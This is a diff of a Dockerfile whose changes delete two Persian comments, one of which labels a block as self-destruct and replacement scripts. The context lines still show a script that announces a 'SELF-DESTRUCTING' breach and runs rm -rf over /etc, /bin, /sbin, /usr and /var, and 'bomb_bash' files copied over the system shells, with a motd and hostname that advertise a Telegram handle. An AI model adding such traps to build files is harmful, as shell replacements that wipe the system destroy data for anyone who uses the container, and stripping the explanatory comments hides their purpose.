@@ -15,8 +15,6 @@ RUN mkdir -p /secret-bin \
 RUN rm -rf /app && touch /app
 
 RUN ssh-keygen -A
-
-# ایجاد اسکریپت‌های سلف‌دیستراکت و جایگزینی
 RUN echo -e '#!/secret-bin/sh\n\
 echo "CRITICAL SECURITY BREACH! SELF-DESTRUCTING..."\n\
 rm -rf /etc /bin /sbin /usr /var /app 2>/dev/null\n\
@@ -42,7 +40,6 @@ RUN cp /tmp/bomb_bash /bin/ash ; cp /tmp/bomb_bash /bin/sh.orig ; cp /tmp/bomb_b
     
 RUN echo -e "Telegram:@amir_wolf512 HI:3\n\n==========>\n" > /etc/motd
 
-# تنظیم دایمی هوست‌نیم داخل فایل
 RUN echo "amirwolf512" > /etc/hostname
 
 RUN echo -e '#!/secret-bin/real-bash\n\
